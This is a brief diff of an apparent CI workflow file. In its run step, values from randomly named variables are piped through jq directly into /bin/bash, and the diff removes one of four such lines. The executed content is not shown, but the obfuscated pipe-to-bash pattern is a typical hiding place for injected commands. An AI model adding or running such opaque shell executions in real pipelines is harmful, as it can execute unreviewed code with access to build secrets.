@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$jw619" | jq -r .jrm53 | /bin/bash
           echo $fe39 | jq -r .tqup380 | /bin/bash
-          printf '%s' "$wwhvp1" | jq -r .wgtku00 | /bin/bash
           echo $gib471 | jq -r .a1191 | /bin/bash
 
       - name: Upload output
